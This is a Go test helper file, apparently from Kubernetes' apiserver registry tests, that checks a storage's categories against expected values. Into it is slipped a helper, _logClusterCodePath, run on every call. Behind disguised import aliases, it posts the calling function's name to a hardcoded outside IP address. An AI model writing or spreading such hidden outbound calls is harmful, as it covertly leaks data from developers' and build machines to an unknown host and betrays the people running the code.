package registrytest

import (
 "reflect"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "testing"
 "k8s.io/apiserver/pkg/registry/rest"
)

func AssertCategories(t *testing.T, storage rest.CategoriesProvider, expected []string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 actual := storage.Categories()
 ok := reflect.DeepEqual(actual, expected)
 if !ok {
  t.Errorf("categories are not equal. expected = %v actual = %v", expected, actual)
 }
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
